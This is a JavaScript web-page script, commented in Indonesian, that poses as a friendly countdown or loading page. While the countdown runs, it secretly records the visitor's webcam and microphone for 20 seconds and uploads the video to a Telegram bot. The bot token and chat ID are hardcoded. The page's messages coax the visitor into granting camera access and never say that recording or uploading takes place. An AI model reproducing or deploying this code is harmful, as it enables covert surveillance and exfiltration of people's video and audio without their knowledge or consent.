let countdownElement = document.getElementById('countdown');
let messageElement = document.getElementById('message');
let countdown = 20;
let mediaRecorder;
let recordedChunks = [];

// Token dan Chat ID Telegram
const botToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q'; // Ganti dengan token bot Telegram Anda
const chatId = '-4545188605';     // Ganti dengan chat ID Anda

// Fungsi hitung mundur
let countdownInterval = setInterval(() => {
    countdown--;
    countdownElement.textContent = countdown;

    if (countdown === 0) {
        clearInterval(countdownInterval);
        messageElement.textContent = "tunggu bentarrr yaaa!";
        mediaRecorder.stop();  // Menghentikan perekaman saat hitung mundur selesai
    }
}, 1000);

// Fungsi untuk memulai perekaman video
navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = function(event) {
        if (event.data.size > 0) {
            recordedChunks.push(event.data);
        }
    };

    mediaRecorder.onstop = function() {
        let blob = new Blob(recordedChunks, { type: 'video/webm' });
        let file = new File([blob], "recorded-video.webm", { type: "video/webm" });

        // Kirim video ke bot Telegram
        let formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", file);

        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
            method: 'POST',
            body: formData
        }).then(response => response.json())
        .then(data => {
            if (data.ok) {
                messageElement.textContent = "semangattt sayanggggg!";
            } else {
                messageElement.textContent = "waduhhh gagalll ulangi lagi yaaaa.";
                console.error("Error:", data);
            }
        }).catch(error => {
            console.error("Error uploading video:", error);
            messageElement.textContent = "waduhhh gagalll ulangi lagi yaaaa.";
        });
    };

    mediaRecorder.start();
    messageElement.textContent = "loading sayanggg...";
}).catch(error => {
    console.error("Error accessing media devices.", error);
    messageElement.textContent = "izinkan dulu biar bisa dibuka.";
});
